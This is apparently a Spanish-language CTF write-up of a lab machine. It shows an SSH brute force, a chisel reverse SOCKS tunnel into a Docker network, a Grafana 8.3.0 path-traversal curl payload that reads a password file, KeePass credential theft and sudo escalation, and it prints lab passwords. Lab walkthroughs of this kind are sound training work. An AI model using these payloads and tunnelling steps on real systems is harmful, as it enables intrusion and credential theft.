Hacemos el escaneo de nmap:
![[Pasted image 20240312144814.png]]
Esto corre por el puerto 80:
![[Pasted image 20240312144844.png]]
Hacemos fuzzing web de archivos, donde intentamos con la extensión .php:
![[Pasted image 20240312144919.png]]
Dentro de este /penguin.php vemos el siguiente contenido, donde se nos saluda como el usuario pinguinito y se nos dice que dentro de esta máquina hay un contenedor de docker de grafana en su versión 8.3.0, así cómo un archivo database_pass.txt en el directorio /tmp del contenedor:
![[Pasted image 20240312145017.png]]
Intentamos acceder por ssh mediante fuerza bruta con el usuario pinguinito, y encontramos la contraseña de love:
![[Pasted image 20240312145310.png]]
Entramos vía SSH:
![[Pasted image 20240312145353.png]]
Ejecutamos el comando hostname -I y vemos una segunda interfaz de red, que nos hace pensar que se trata de docker, tal y como se nos mostró en el puerto 80 de apache:
![[Pasted image 20240312145459.png]]
Para entrar dentro de esta red y sacar los contenedores que haya en su interior, tenemos que usar chisel. Por lo que lo tenemos en la máquina atacante y lo compartimos con la máquina víctima:
![[Pasted image 20240312145627.png]]
![[Pasted image 20240312145605.png]]
Una vez hecho esto, nos ponemos en escucha a modo de servidor con chisel desde la máquina atacante:
```bash
./chisel server --reverse -p 1234
```
![[Pasted image 20240312145714.png]]
Y nos conectamos desde el cliente pasando todo el tráfico a la máquina atacante:
```bash
./chisel client 192.168.0.20:1234 R:socks
```
![[Pasted image 20240312145747.png]]
Ahora desde el navegador tenemos que indicar que el tráfico pase por el túnel:
![[Pasted image 20240312145824.png]]
Así como asegurarnos de haber especificado dicho túnel en el archivo de configuración de Proxychains:
![[Pasted image 20240312145901.png]]
De tal forma que si accedemos al puerto 3000 (que es donde corre grafana por defecto) y ponemos la IP 172.17.0.2 (ya que por defecto docker crea contenedores empezando por la IP .2, luego .3, etc), podremos acceder al grafana del contenedor:
![[Pasted image 20240312150024.png]]
Esta versión de grafana es vulnerable a LFI, por lo que intentamos explotar esto leyendo el archivo database_pass.txt ubicado en el directorio /tmp, tal y como se nos indicó dentro del puerto 80:
```bash
proxychains curl 'http://172.17.0.2:3000/public/plugins/text/../../../../../../../../../../../../tmp/database_pass.txt' --path-as-is
```
Y obtenemos la contraseña de la base de datos:
```bash
supermegastrongpasswordpenguin
```
![[Pasted image 20240312150522.png]]
Nos traemos la base de datos a nuestra máquina atacante:
![[Pasted image 20240312150637.png]]
![[Pasted image 20240312150646.png]]
La abrimos con keepass, por tanto primero vamos a instalar el cliente desde flatpak:
![[Pasted image 20240312150847.png]]
Accedemos a las credenciales del usuario ballenasio:
```bash
ballenasio:secureballenasio
```
Y vemos que funcionan:
![[Pasted image 20240312151027.png]]
Además, este usuario está dentro del grupo sudo, por lo que si volvemos a poner la misma contraseña ya llegamos a root:
![[Pasted image 20240312151100.png]]